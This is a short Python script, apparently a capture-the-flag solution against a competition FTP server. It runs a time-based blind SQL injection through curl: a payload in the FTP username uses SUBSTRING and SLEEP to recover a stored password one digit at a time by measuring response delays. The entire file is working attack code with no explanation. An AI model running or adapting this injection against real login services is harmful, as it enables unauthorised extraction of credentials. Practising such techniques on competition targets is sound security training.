from datetime import datetime
import os
import string
from time import sleep


passwd = ""
i = 1
while True:
    for c in string.digits:
        st = datetime.now().timestamp()
        os.system(f"""curl "ftp://boss'%20AND%20IF(SUBSTRING(password%2C1%2C{i})%3D'{passwd}{c}'%2CSLEEP(2)%2C'a')%3B%20--%20:1@ftp.ecsc23.hack.cert.pl:5005/" -vvvv 1> /dev/null 2>&1""")

        print(datetime.now().timestamp() - st)

        if datetime.now().timestamp() - st > 1.95:
            passwd += c
            i += 1
            print(f"found: {c=}, {passwd=}")
            break
        sleep(1)
    else:
        print("passwd:", passwd)
        exit(0)
